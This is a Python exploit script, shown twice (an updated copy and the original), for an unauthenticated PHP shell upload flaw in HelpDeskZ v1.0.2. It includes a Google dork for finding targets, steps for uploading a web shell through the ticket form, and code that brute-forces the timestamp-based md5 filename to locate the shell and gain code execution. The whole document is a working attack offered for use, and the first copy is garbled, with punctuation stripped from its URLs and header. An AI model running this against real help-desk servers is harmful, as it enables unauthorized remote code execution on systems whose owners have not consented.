'''
#
# Updated Exploit Provided by Drew Griess
#
# Exploit Title HelpDeskZ = v1.0.2 - Unauthenticated Shell Upload
# Google Dork intextHelp Desk Software by HelpDeskZ
# Date 2016-08-26
# Exploit Author Lars Morgenroth - @krankoPwnz
# Vendor Homepage httpwww.helpdeskz.com
# Software Link httpsgithub.comevolutionscriptHelpDeskZ-1.0archivemaster.zip
# Version = v1.0.2
# Tested on
# CVE

HelpDeskZ = v1.0.2 suffers from an unauthenticated shell upload vulnerability.

The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file

controllers httpsgithub.comevolutionscriptHelpDeskZ-1.0tree006662bb856e126a38f2bb76df44a2e4e3d37350controllerssubmit_ticket_controller.php - Line 141
$filename = md5($_FILES['attachment']['name'].time())...$ext;

So by guessing the time the file was uploaded, we can get RCE.

Steps to reproduce

httplocalhosthelpdeskzv=submit_ticket&action=displayForm

Enter anything in the mandatory fields, attach your phpshell.php, solve the captcha and submit your ticket.

Call this script with the base url of your HelpdeskZ-Installation and the name of the file you uploaded

exploit.py httplocalhosthelpdeskz phpshell.php
'''
import hashlib
import time
import sys
import requests
import datetime

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]


r = requests.get(helpdeskzBaseUrl)

#Gets the current time of the server to prevent timezone errors - DoctorEww
currentTime = int((datetime.datetime.strptime(r.headers['date'], '%a, %d %b %Y %H:%M:%S %Z')  - datetime.datetime(1970,1,1)).total_seconds())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print 'found!'
        print url
        sys.exit(0)

print 'Sorry, I did not find anything'
'''
# Exploit Title: HelpDeskZ <= v1.0.2 - Unauthenticated Shell Upload
# Google Dork: intext:"Help Desk Software by HelpDeskZ"
# Date: 2016-08-26
# Exploit Author: Lars Morgenroth - @krankoPwnz
# Vendor Homepage: http://www.helpdeskz.com/
# Software Link: https://github.com/evolutionscript/HelpDeskZ-1.0/archive/master.zip
# Version: <= v1.0.2
# Tested on:
# CVE :

HelpDeskZ <= v1.0.2 suffers from an unauthenticated shell upload vulnerability.

The software in the default configuration allows upload for .php-Files ( ?!?! ). I think the developers thought it was no risk, because the filenames get "obfuscated" when they are uploaded. However, there is a weakness in the rename function of the uploaded file:

/controllers <https://github.com/evolutionscript/HelpDeskZ-1.0/tree/006662bb856e126a38f2bb76df44a2e4e3d37350/controllers>/*submit_ticket_controller.php - Line 141*
$filename = md5($_FILES['attachment']['name'].time()).".".$ext;

So by guessing the time the file was uploaded, we can get RCE.

Steps to reproduce:

http://localhost/helpdeskz/?v=submit_ticket&action=displayForm

Enter anything in the mandatory fields, attach your phpshell.php, solve the captcha and submit your ticket.

Call this script with the base url of your HelpdeskZ-Installation and the name of the file you uploaded:

exploit.py http://localhost/helpdeskz/ phpshell.php

import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

currentTime = int(time.time())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)

print "Sorry, I did not find anything"
'''